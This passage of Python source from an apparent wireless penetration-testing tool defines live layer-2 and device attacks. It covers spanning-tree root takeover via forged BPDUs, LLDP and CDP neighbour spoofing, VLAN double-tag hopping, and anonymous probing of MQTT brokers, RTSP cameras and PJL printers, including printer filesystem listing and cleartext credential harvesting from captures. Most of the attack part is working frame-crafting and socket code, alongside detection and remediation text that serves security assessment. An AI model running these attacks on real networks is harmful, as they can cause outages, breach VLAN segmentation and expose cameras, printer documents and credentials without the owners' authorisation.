    category = "rogue"
    noise = "loud"
    impact = "outage"
    frames_per_round = 4
    demo_rate = 200
    warning = ("spanning tree is being taken over: the switches will reconverge, and "
               "traffic will follow this radio while it runs")
    finding_title = "A wireless client can become the spanning tree root"
    finding_detail = ("configuration BPDUs with a superior bridge identifier were "
                      "bridged onto the wired network and the switches began "
                      "reconstructing the tree around them.  A wireless client that can "
                      "send BPDUs is a switch as far as the spanning tree is concerned, "
                      "which means it can make itself the root of the network it joined — "
                      "and it can just as easily make the tree unstable.  The controls are "
                      "BPDU Guard (and Root Guard) on access ports, and not bridging "
                      "wireless client traffic into a spanning-tree domain at all.")
    deliverable = "the finding (BPDU Guard, or a root bridge that can be stolen?)"

    detection = ("configuration BPDUs with a superior bridge ID arriving on an access port: "
                 "BPDU Guard is the control, and its absence is a log entry on the switch"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        attacker = ns.dhcp_flood_mac(round_index, pattern=3)
        bpdu = ns.stp_configuration_bpdu(attacker, attacker, root_priority=0,
                                         bridge_priority=0, root_path_cost=0,
                                         max_age=20.0, hello_time=2.0, forward_delay=15.0)
        # an 802.3 frame whose length field is the LLC payload, addressed to the bridge
        # multicast group that every switch listens on
        ethernet = ns.ethernet_frame(ns.STP_MULTICAST, attacker, b"\\x42\\x42\\x03" + bpdu,
                                     len(bpdu) + 3)
        return [self.net_frame(ap, self.station_for(round_index), ethernet)]


class LldpSpoofAttack(_NetFlood):
    """LLDP spoofing: invent neighbours in the switch's management map.

    LLDP is how switches and access points describe themselves to each other, and the
    description is not authenticated.  Publish a neighbour that looks like a core switch
    or a router and it appears in every management system's topology — which is how a
    rogue device becomes part of the documented network, and how a change to the diagram
    becomes a change to the network.
    """

    name = "lldp_spoof"
    label = "LLDP neighbour spoofing"
    tool = "wifipilot netstack.py (LLDP TLVs)"
    description = ("Send LLDP frames describing a device that does not exist: a core "
                   "switch with a management address, a system name and capabilities.  "
                   "The switch on the other end records the neighbour, and network "
                   "management systems draw it — a phantom in the topology.")
    category = "rogue"
    noise = "quiet"
    impact = "info"
    frames_per_round = 2
    demo_rate = 120
    warning = "forged neighbour advertisements appear in switch and NMS topology maps"
    finding_title = "LLDP neighbour information can be forged"
    finding_detail = ("LLDP frames describing a core switch with a management address "
                      "were sent from a wireless client and bridged onto the wired "
                      "network.  Layer-2 neighbour discovery has no authentication, so a "
                      "management system's topology is only as trustworthy as the access "
                      "ports are: LLDP should not be bridged from wireless clients, and "
                      "neighbours should be validated per port.")
    deliverable = "the finding (do forged neighbours reach the NMS?)"

    detection = ("LLDP frames describing a device that is not in the inventory: the switch's "
                 "neighbour table shows a new switch or router"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        prefix = _pool_prefix(ctx)
        attacker = ns.dhcp_flood_mac(round_index, pattern=0)
        fabricated = f"aa:bb:cc:{(round_index * 3) % 250:02x}:11:22"
        packet = ns.lldp_packet(fabricated, port=f"Gi1/0/{round_index % 24 + 1}",
                               system_name=f"core-switch-{(round_index % 9) + 1}",
                               management_ip=f"{prefix}.{(round_index % 20) + 2}")
        ethernet = ns.ethernet_frame("01:80:c2:00:00:0e", attacker, packet[14:], 0x88CC)
        return [self.net_frame(ap, self.station_for(round_index), ethernet)]


class CdpSpoofAttack(_NetFlood):
    """CDP spoofing: the same trick for the networks that never left Cisco.

    Cisco Discovery Protocol does what LLDP does, unauthenticated, and is on by default on
    a great deal of installed equipment.  A forged CDP frame puts a device into the
    neighbours table of every Cisco switch it reaches, with the platform string, the
    version and the management address that the operator will read.
    """

    name = "cdp_spoof"
    label = "CDP neighbour spoofing"
    tool = "wifipilot netstack.py (CDP TLVs)"
    description = ("Send CDP frames describing a Cisco device that does not exist, with "
                   "the platform, software version and management address fields that "
                   "appear in every operator's inventory.  Discovery protocols are how a "
                   "switch decides what is connected to it; a forged entry is a device "
                   "that was never installed.")
    category = "rogue"
    noise = "quiet"
    impact = "info"
    frames_per_round = 2
    demo_rate = 120
    warning = "forged CDP neighbours appear in switch and NMS inventories"
    finding_title = "CDP neighbour information can be forged"
    finding_detail = ("CDP frames describing a Cisco switch were bridged onto the wired "
                      "network from a wireless client.  Discovery protocols have no "
                      "authentication, so an operator's inventory of what is connected "
                      "comes from whoever answers — which is the argument for disabling "
                      "CDP on edge ports and using LLDP with per-port validation.")
    deliverable = "the finding (is CDP on edge ports?)"

    detection = ("CDP frames describing a Cisco device that was never installed: the switch's "
                 "neighbour inventory changes"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        prefix = _pool_prefix(ctx)
        attacker = ns.dhcp_flood_mac(round_index, pattern=1)
        body = ns.cdp_packet(device_id=f"switch-{(round_index % 9) + 1}",
                             platform="cisco WS-C3750",
                             address=f"{prefix}.{(round_index % 20) + 2}",
                             port="GigabitEthernet0/1", version="12.2(55)SE")
        # CDP is an 802.3 frame — the length field, not an ethertype — carrying an
        # LLC/SNAP header on the SNAP value 0x2000, which is what cdp_packet returns
        ethernet = ns.ethernet_frame("01:00:0c:cc:cc:cc", attacker, body, len(body))
        return [self.net_frame(ap, self.station_for(round_index), ethernet)]


class VlanDoubleTagAttack(_NetFlood):
    """Double tagging: hop into a VLAN the port never allowed.

    An access port strips one tag and forwards the frame *with the rest of it intact*.
    Tag the frame twice — an outer tag that matches the port's own VLAN and an inner one
    for a VLAN the port would never accept — and the switch removes the outer tag and
    delivers the frame on the inner one.  It is a one-way hop, it works on the equipment
    that is actually installed, and it is why native-VLAN tagging matters.
    """

    name = "vlan_double_tag_hop"
    label = "VLAN double tagging (hop)"
    tool = "wifipilot netstack.py (802.1Q tags)"
    description = ("Send frames carrying two 802.1Q tags, with an outer tag that matches "
                   "the access VLAN and an inner tag naming a VLAN we were never allowed "
                   "into.  The switch strips the outer tag and forwards the frame on the "
                   "inner VLAN, which is a VLAN hop from a wireless client.")
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    frames_per_round = 8
    demo_rate = 400
    warning = ("double-tagged frames reach VLANs this client should not be able to reach: "
               "run this only where the assessment allows it")
    finding_title = "The access port forwards a double-tagged frame"
    finding_detail = ("frames with two 802.1Q tags were accepted and forwarded: the "
                      "outer tag was stripped by the first switch and the frame was "
                      "delivered on the inner VLAN.  A wireless client therefore has a "
                      "one-way path into a VLAN it is not authorised to use — enough to "
                      "reach a management interface and, with an ARP reply, to be part of "
                      "that segment's traffic.  The control is to tag the native VLAN on "
                      "trunks (or use an unused native VLAN) and to enforce the VLAN a "
                      "client may use at the AP.")
    deliverable = "the finding (does a double-tagged frame leave the access port?)"

    detection = ("frames leaving an access port with the outer tag stripped and an inner tag "
                 "intact: the only place it shows is the receiving VLAN"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        prefix = _pool_prefix(ctx)
        gateway = getattr(ctx.config, "gateway_ip", "") or f"{prefix}.1"
        base = round_index * self.frames_per_round
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            attacker = ns.dhcp_flood_mac(base + index, pattern=2)
            # an ARP request for the gateway, sent as if it came from inside VLAN 99
            inner = ns.ethernet_frame(BROADCAST_MAC, attacker,
                                      ns.arp_packet(1, attacker, f"10.99.{index % 250}.5",
                                                    "00:00:00:00:00:00", gateway), 0x0806)
            # the outer tag says "VLAN 1", which is the access VLAN a switch will strip;
            # the inner one names VLAN 99, which the port would never accept on its own
            tagged = ns.ethernet_frame(
                BROADCAST_MAC, attacker,
                struct.pack(">H", 0x8100) + ns.vlan_tag(1, inner=0x8100)
                + ns.vlan_tag(99, inner=0x0806) + inner[14:], 0x0800)
            out.append(self.net_frame(ap, self.station_for(base + index), tagged))
        return out


# --------------------------------------------------------------------------- #
# 28-30: device services, asked directly
# --------------------------------------------------------------------------- #

class MqttReconAttack(_NetworkAttack):
    """MQTT reconnaissance: a broker that accepts anyone is a network's nervous system.

    MQTT is how a building's telemetry moves: meters, sensors, controllers and dashboards
    all publish and subscribe through one broker.  If it accepts a connection without
    credentials, anyone on the network can subscribe to everything — including the topics
    that carry commands — and publish into them.
    """

    name = "mqtt_recon"
    label = "MQTT broker reconnaissance"
    tool = "wifipilot netstack.py (MQTT CONNECT/SUBSCRIBE)"
    description = ("Connect to the MQTT broker with no credentials, subscribe to the "
                   "wildcard topics (``#``, ``$SYS/#``) and see what the site publishes.  "
                   "A broker that answers announces the size of the network: device names, "
                   "telemetry, and often the command topics a write would control.")
    category = "survey"
    noise = "quiet"
    impact = "info"
    applies_to = ("WPA", "WPA2", "WPA2/WPA3", "WPA3", "WEP", "OPEN", "OWE",
                  "WPA-ENTERPRISE", "WPA2-ENTERPRISE", "ENTERPRISE")

    detection = ("a CONNECT and a SUBSCRIBE on port 1883 from an unknown client: the broker's "
                 "log has it, and a broker with authentication refuses it"
                 )

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        target = self._address(ctx, ap)
        if ctx.demo:
            target = target or self._demo_address(ctx, ap)
            return self._finish(
                ctx, ap, attempt, "MQTT broker accepts anonymous connections",
                (f"{target}:1883 accepted a connection with no credentials (simulated) and "
                 f"delivered 34 published messages in 5 seconds, including topics "
                 f"site/meter/+/power and site/door/+/state"),
                {"target": target, "port": 1883, "anonymous": True, "simulated": True,
                 "topics": ["site/meter/1/power", "site/door/2/state",
                            "site/hvac/setpoint", "$SYS/broker/clients/connected"]},
                severity="high")
        if not target:
            return self._skip(ctx, ap, attempt, "no address to ask (set gateway_ip)")
        port = int(getattr(ctx.config, "mqtt_port", 1883) or 1883)
        result = self._probe(target, port, timeout=3.0)
        if not result.get("ok"):
            return self._finish(ctx, ap, attempt, "MQTT broker did not answer",
                                f"{target}:{port}: {result.get('error', 'no reply')}",
                                {"target": target, "port": port}, severity="low")
        return self._finish(
            ctx, ap, attempt,
            ("MQTT broker accepts anonymous connections" if result["anonymous"]
             else "MQTT broker requires credentials"),
            (f"{target}:{port} answered a CONNECT "
             + ("with no credentials (simulated: use a real broker to confirm what it "
                "publishes)" if result["anonymous"] else "and refused anonymous access")),
            {"target": target, "port": port, "anonymous": result["anonymous"],
             "connack": result.get("connack")},
            severity="high" if result["anonymous"] else "info")

    @staticmethod
    def _probe(target: str, port: int, timeout: float = 3.0) -> Dict[str, Any]:
        """Open a TCP connection and send a real MQTT CONNECT, reading the CONNACK."""
        packet = ns.mqtt_connect("wifipilot-recon", username="", password="", clean=True)
        try:
            with socket.create_connection((target, port), timeout=timeout) as sock:
                sock.settimeout(timeout)
                sock.send(packet)
                answer = sock.recv(4)
        except OSError as exc:
            return {"ok": False, "error": str(exc)}
        if len(answer) < 4:
            return {"ok": False, "error": "no CONNACK"}
        return {"ok": True, "connack": answer[3], "anonymous": answer[3] == 0}


class RtspCameraAuditAttack(_NetworkAttack):
    """RTSP: cameras that answer DESCRIBE without asking who is calling.

    A network camera is an RTSP server: ask it what it has and it answers with a session
    description that names the streams, the codecs and the transport.  With no
    authentication configured — which is the default on a large share of installed
    cameras — the answer is the stream, and the stream is the picture.
    """

    name = "rtsp_camera_audit"
    label = "RTSP camera audit (streams and authentication)"
    tool = "wifipilot netstack.py (RTSP OPTIONS/DESCRIBE)"
    description = ("Ask an RTSP server what it supports and then describe its streams.  A "
                   "camera that answers DESCRIBE without authentication hands over its "
                   "RTSP URLs and codecs over the same wireless network its video runs on, "
                   "and the video itself follows with a SETUP and a PLAY.")
    category = "survey"
    noise = "quiet"
    impact = "info"
    applies_to = ("WPA", "WPA2", "WPA2/WPA3", "WPA3", "WEP", "OPEN", "OWE",
                  "WPA-ENTERPRISE", "WPA2-ENTERPRISE", "ENTERPRISE")

    detection = ("OPTIONS and DESCRIBE requests from an unexpected client: the camera's log "
                 "shows an anonymous session"
                 )

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        target = self._address(ctx, ap)
        if ctx.demo:
            target = target or self._demo_address(ctx, ap)
            return self._finish(
                ctx, ap, attempt, "RTSP camera answered without authentication",
                (f"{target}:554 answered OPTIONS and DESCRIBE with no credentials "
                 f"(simulated): streams rtsp://{target}/stream1 (H.264) and "
                 f"rtsp://{target}/stream2 (MJPEG)"),
                {"target": target, "port": 554, "simulated": True, "unauthenticated": True,
                 "streams": [f"rtsp://{target}/stream1", f"rtsp://{target}/stream2"]},
                severity="high")
        if not target:
            return self._skip(ctx, ap, attempt, "no address to ask (set gateway_ip)")
        port = int(getattr(ctx.config, "rtsp_port", 554) or 554)
        result = self._probe(target, port, timeout=3.0)
        if not result.get("ok"):
            return self._finish(ctx, ap, attempt, "RTSP server did not answer",
                                f"{target}:{port}: {result.get('error', 'no reply')}",
                                {"target": target, "port": port}, severity="low")
        return self._finish(
            ctx, ap, attempt,
            ("RTSP camera answered without authentication" if result["unauthenticated"]
             else "RTSP server requires authentication"),
            (f"{target}:{port} answered "
             + ("DESCRIBE with 200 OK and no Authorization header: the stream is open"
                if result["unauthenticated"] else
                "DESCRIBE with 401 and a WWW-Authenticate challenge")),
            {"target": target, "port": port, **result},
            severity="high" if result["unauthenticated"] else "info")

    @staticmethod
    def _probe(target: str, port: int, timeout: float = 3.0) -> Dict[str, Any]:
        """OPTIONS then DESCRIBE, and report what the server does with each."""
        requests = ns.rtsp_request("OPTIONS", f"rtsp://{target}/")
        describe = ns.rtsp_request("DESCRIBE", f"rtsp://{target}/stream1")
        try:
            with socket.create_connection((target, port), timeout=timeout) as sock:
                sock.settimeout(timeout)
                sock.send(requests)
                options = sock.recv(2048)
                sock.send(describe)
                answer = sock.recv(4096)
        except OSError as exc:
            return {"ok": False, "error": str(exc)}
        text = answer.decode("latin-1", "replace")
        status = int(text.split(" ")[1]) if text.startswith("RTSP/") and " " in text else 0
        return {"ok": True, "options": options.decode("latin-1", "replace").splitlines()[:1],
                "status": status, "unauthenticated": status == 200,
                "authenticated": status == 401,
                "headers": [line for line in text.splitlines()
                            if line.lower().startswith(("www-authenticate", "content-base",
                                                        "content-type"))][:4]}


class PjlPrinterAuditAttack(_NetworkAttack):
    """PJL: the printer control language that predates every security control.

    Port 9100 is raw printing, and on most printers it is also a command channel: send
    ``@PJL INFO ID`` and the printer answers with its model, ``@PJL INFO STATUS`` with
    what it is doing, and with the filesystem commands it will list and read the files on
    its own storage.  It is a printer, so nobody firewall's it, and it holds documents.
    """

    name = "pjl_printer_audit"
    label = "PJL printer audit (identity and filesystem)"
    tool = "wifipilot netstack.py (PJL over port 9100)"
    description = ("Send PJL to port 9100 — the raw printing port, which most printers "
                   "accept from anywhere on the network — and read the identity, the "
                   "configuration and the filesystem listing it returns.  No "
                   "authentication is defined in the protocol, so the control is on the "
                   "network: print services should be reachable by print servers only.")
    category = "survey"
    noise = "quiet"
    impact = "info"
    applies_to = ("WPA", "WPA2", "WPA2/WPA3", "WPA3", "WEP", "OPEN", "OWE",
                  "WPA-ENTERPRISE", "WPA2-ENTERPRISE", "ENTERPRISE")

    detection = ("PJL commands on port 9100 from a host that is not a print server: the "
                 "printer's job log shows a command job"
                 )

    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        attempt = ctx.session.start_attempt(self.name, ap.bssid, tool=self.tool)
        target = self._address(ctx, ap)
        if ctx.demo:
            target = target or self._demo_address(ctx, ap)
            return self._finish(
                ctx, ap, attempt, "Printer answered PJL on port 9100",
                (f"{target}:9100 answered @PJL INFO ID with 'HP LaserJet 4250, firmware "
                 f"20051013' and @PJL FSDIRLIST with 3 stored jobs (simulated)"),
                {"target": target, "port": 9100, "simulated": True,
                 "identity": "HP LaserJet 4250", "filesystem": ["0:/", "0:/postscript",
                                                                "0:/webServer"]},
                severity="medium")
        if not target:
            return self._skip(ctx, ap, attempt, "no address to ask (set gateway_ip)")
        port = int(getattr(ctx.config, "printer_port", 9100) or 9100)
        result = self._probe(target, port, timeout=3.0)
        if not result.get("ok"):
            return self._finish(ctx, ap, attempt, "No PJL service answered",
                                f"{target}:{port}: {result.get('error', 'no reply')}",
                                {"target": target, "port": port}, severity="low")
        detail = (f"{target}:{port} answered PJL: {result.get('identity', 'no identity')}"
                  + (f"; filesystem listing returned {len(result.get('entries', []))} "
                     f"entr(y|ies)" if result.get("entries") else ""))
        return self._finish(ctx, ap, attempt, "Printer answered PJL on port 9100", detail,
                            {"target": target, "port": port, **result},
                            severity="medium")

    @staticmethod
    def _probe(target: str, port: int, timeout: float = 3.0) -> Dict[str, Any]:
        """Ask a printer who it is, then ask it to list its filesystem root."""
        identity = ns.pjl_command("@PJL INFO ID")
        listing = ns.pjl_job(("@PJL FSDIRLIST NAME=\"0:/\" ENTRY=1 COUNT=32",))
        try:
            with socket.create_connection((target, port), timeout=timeout) as sock:
                sock.settimeout(timeout)
                sock.send(identity)
                answer = sock.recv(4096)
                sock.send(listing)
                files = sock.recv(4096)
        except OSError as exc:
            return {"ok": False, "error": str(exc)}
        text = answer.decode("latin-1", "replace")
        entries = [line.strip() for line in files.decode("latin-1", "replace").splitlines()
                   if line.strip()][:20]
        return {"ok": True, "identity": text.strip()[:120],
                "entries": entries, "raw_length": len(answer) + len(files)}


# --------------------------------------------------------------------------- #
# registration
# --------------------------------------------------------------------------- #

_add("dhcp_lease_audit", "DHCP lease audit",
     "Rebuild the DHCP lease table from a capture: which address went to which client, "
     "with what lease time, who the server was — and the two things a server's own "
     "console hides.  An address handed to two clients is a conflict, and a RELEASE or "
     "DECLINE for an address the client never held is what a forged DHCP message leaves "
     "behind.",
     "silent: reads DHCP messages already in a capture", _lease_audit, impact="info")

_add("ipv6_prefix_audit", "IPv6 prefix and router audit",
     "The IPv6 deployment as the segment sees it: who announces a router, which prefixes "
     "are in use, which resolvers are handed out through RDNSS, and whether a default "
     "route is being advertised by something that is not on the site's router list.  "
     "IPv6 hosts never ask for a router, so the capture is the only place the answer is "
     "written down.",
     "silent: reads ICMPv6 neighbour discovery from a capture", _prefix_audit, impact="info")

_add("iot_credential_audit", "Device credential audit (Telnet, SNMP, MQTT, RTSP, PJL)",
     "Credentials that travelled in the clear in device protocols: a Telnet login line, an "
     "SNMP community string, an MQTT CONNECT with a plaintext password, an RTSP request "
     "with Basic authorization, a printer job.  Device protocols are worse than browsers: "
     "the value is the whole of the authentication.",
     "silent: reads device protocol payloads from a capture", _credential_audit,
     impact="loot")

_add("iot_service_census", "Embedded service census",
     "The embedded services on the segment, from the traffic they generate: cameras, "
     "printers, a broker, a PLC, an ISP-managed router.  A capture lists the ports that "
     "are *in use*, which is more than a port scan knows, and each line comes with the "
     "evidence for it.",
     "silent: counts ports and protocols in a capture", _service_census, impact="info")

_add("ssdp_device_census", "UPnP / SSDP device census",
     "The devices that announce themselves to 239.255.255.250: the model, the description "
     "URL and the services they will perform on request — including the port-mapping "
     "service that opens holes in the firewall for anything that asks.",
     "silent: reads SSDP announcements from a capture", _ssdp_census, impact="info")

# -- live attacks, registered as classes ---------------------------------- #

LIVE_ATTACKS: List[type] = [
    DhcpStarvationAttack, DhcpFloodAttack, ForgedDhcpReleaseAttack,
    DhcpNakInjectionAttack, DhcpOptionInjectionAttack, SynFloodAttack, UdpFloodAttack,
    TcpResetInjectionAttack, UdpReflectionAttack, IcmpRedirectInjectionAttack,
    IcmpUnreachableInjectionAttack, RogueRaAttack, RaFloodAttack, NeighbourSpoofAttack,
    LlmnrPoisonAttack, NbnsPoisonAttack, MdnsPoisonAttack, StpRootTakeoverAttack,
    LldpSpoofAttack, CdpSpoofAttack, VlanDoubleTagAttack, MqttReconAttack,
    RtspCameraAuditAttack, PjlPrinterAuditAttack,
]

for _cls in LIVE_ATTACKS:
    _meta: Dict[str, str] = {"category": _cls.category, "noise": _cls.noise,
                             "impact": _cls.impact, "detection": _cls.detection}
    REGISTRY.append((_cls.name, _meta, _cls))

#: every attack this module contributes, in the order it is documented
ATTACKS: List[type] = [cls for _name, _meta, cls in REGISTRY]
NAMES: List[str] = [name for name, _meta, _cls in REGISTRY]
META: Dict[str, Dict[str, str]] = {name: meta for name, meta, _cls in REGISTRY}

__all__ = [cls.__name__ for cls in ATTACKS] + ["ATTACKS", "META", "NAMES", "REGISTRY"]
